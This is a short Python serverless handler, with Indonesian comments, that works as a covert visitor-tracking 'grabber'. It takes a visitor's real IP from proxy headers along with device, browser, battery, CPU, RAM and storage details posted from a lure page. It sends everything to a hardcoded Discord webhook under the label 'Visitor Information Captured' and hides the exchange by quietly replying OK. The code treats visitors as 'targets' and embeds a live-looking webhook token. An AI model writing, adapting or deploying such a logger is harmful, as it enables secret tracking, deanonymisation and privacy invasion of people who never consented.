from http.server import BaseHTTPRequestHandler
import json
import requests

# --- KONFIGURASI MASTER ---
# GANTI URL DI BAWAH PAKE WEBHOOK DISCORD PUNYA MASTER!
WEBHOOK_URL = "https://discord.com/api/webhooks/1478153467590873131/1Y7myadtqmYjdujwkbYTa2tq6xlN9pwjB4Wm0aVUV8auB7ukMIiEwuyj0YUmJw1YwTmx"

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Baca data yang dikirim dari index.html
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)
        
        # Ambil IP Asli Target (Vercel naruh IP di header ini)
        ip = self.headers.get('x-forwarded-for', self.headers.get('x-real-ip', 'Unknown'))

        # Format Embed Discord Biar Rapi Kaya Yang Master Mau
        payload = {
            "username": "REV-OFFICIAL MONITOR",
            "avatar_url": "https://i.imgur.com/AfFp7pu.png",
            "embeds": [{
                "title": "📊 Visitor Information Captured",
                "color": 15158332, # Warna Merah Darah
                "fields": [
                    {"name": "🖥️ Device & Browser", "value": f"• Model: {data.get('device')}\n• UA: {data.get('ua')}", "inline": False},
                    {"name": "🌐 Network Info", "value": f"• IP: {ip}\n• Lang: {data.get('lang')}", "inline": True},
                    {"name": "🖼️ Display", "value": f"• Res: {data.get('res')}", "inline": True},
                    {"name": "🔋 Battery Status", "value": f"• Level: {data.get('batt')}\n• Charging: {data.get('char')}", "inline": True},
                    {"name": "💾 Hardware & Storage", "value": f"• CPU: {data.get('cpu')} Cores\n• RAM: {data.get('ram')}\n• Used: {data.get('st_used')}GB / {data.get('st_total')}GB", "inline": False}
                ],
                "footer": {"text": "⚡ Developed by: @REV-OFFICIAL"}
            }]
        }

        # Tembak ke Discord
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
        except:
            pass
        
        # Kirim respon balik ke browser target (biar gak error)
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')
        return
      
